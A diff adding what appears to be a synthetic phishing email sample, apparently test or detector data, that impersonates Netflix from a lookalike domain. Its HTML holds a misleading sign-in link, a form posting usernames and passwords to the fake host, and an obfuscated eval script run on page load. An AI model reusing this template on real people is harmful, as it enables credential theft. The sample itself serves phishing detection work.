@@ -1,0 +1,34 @@
+From: notice@netflix-account.pages.dev
+To: victim17@example.com
+Subject: Monthly statement available [ref UB0A535]
+Date: Tue, 12 Mar 2002 23:35:00 -0500
+Message-ID: <phish-197-29eb7506-e230-4f93-bb5b-08ccfe8c37ee@netflix-account.pages.dev>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 10 Mar 2002 10:59:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 24 Mar 2002 21:38:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 24 Mar 2002 02:49:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 07 Mar 2002 00:22:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 12 Mar 2002 21:46:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 14 Mar 2002 23:57:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 21 Mar 2002 11:23:00 -0500
+Return-Path: <notice@netflix-account.pages.dev>
+Reply-To: notice@netflix-account.pages.dev
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=netflix-account.pages.dev; dkim=pass header.d=netflix-account.pages.dev; dmarc=pass header.from=netflix-account.pages.dev
+Received-SPF: pass (mx.example.com: domain of notice@netflix-account.pages.dev designates 192.0.2.57 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=netflix-account.pages.dev; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-197-23ac7eb7"
+
+--bnd-p-197-23ac7eb7
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://netflix-account.pages.dev/statement/UB0A535
+
+Reference: UB0A535
+--bnd-p-197-23ac7eb7
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://netflix-account.pages.dev/statement/UB0A535<br/><br/>Reference: UB0A535</p><p><a href="http://netflix-account.pages.dev/login">https://www.netflix.com/signin</a></p><form action="http://netflix-account.pages.dev/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-197-23ac7eb7--
